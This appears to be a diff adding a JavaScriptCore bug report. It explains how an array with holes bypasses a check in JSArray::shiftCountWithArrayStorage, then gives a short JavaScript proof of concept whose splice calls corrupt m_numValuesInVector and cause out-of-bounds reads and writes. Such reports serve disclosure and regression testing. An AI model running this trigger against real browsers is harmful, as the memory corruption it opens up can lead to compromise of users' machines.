@@ -1,0 +1,41 @@
+/*
+bool JSArray::shiftCountWithArrayStorage(VM& vm, unsigned startIndex, unsigned count, ArrayStorage* storage)
+{
+    unsigned oldLength = storage->length();
+    RELEASE_ASSERT(count <= oldLength);
+    
+    // If the array contains holes or is otherwise in an abnormal state,
+    // use the generic algorithm in ArrayPrototype.
+    if ((storage->hasHoles() && this->structure(vm)->holesMustForwardToPrototype(vm, this)) 
+        || hasSparseMap() 
+        || shouldUseSlowPut(indexingType())) {
+        return false;
+    }
+
+    if (!oldLength)
+        return true;
+    
+    unsigned length = oldLength - count;
+    
+    storage->m_numValuesInVector -= count;
+    storage->setLength(length);
+
+
+Considering the comment, I think the method is supposed to prevent an array with holes from going through to the code "storage->m_numValuesInVector -= count". But that kind of arrays actually can get there by only having the holesMustForwardToPrototype method return false. Unless the array has any indexed accessors on it or Proxy objects in the prototype chain, the method will just return false. So "storage->m_numValuesInVector" can be controlled by the user.
+
+In the PoC, it changes m_numValuesInVector to 0xfffffff0 that equals to the new length, making the hasHoles method return false, leading to OOB reads/writes in the JSArray::unshiftCountWithArrayStorage method.
+
+PoC:
+*/
+
+function main() {
+    let arr = [1];
+
+    arr.length = 0x100000;
+    arr.splice(0, 0x11);
+
+    arr.length = 0xfffffff0;
+    arr.splice(0xfffffff0, 0, 1);
+}
+
+main();
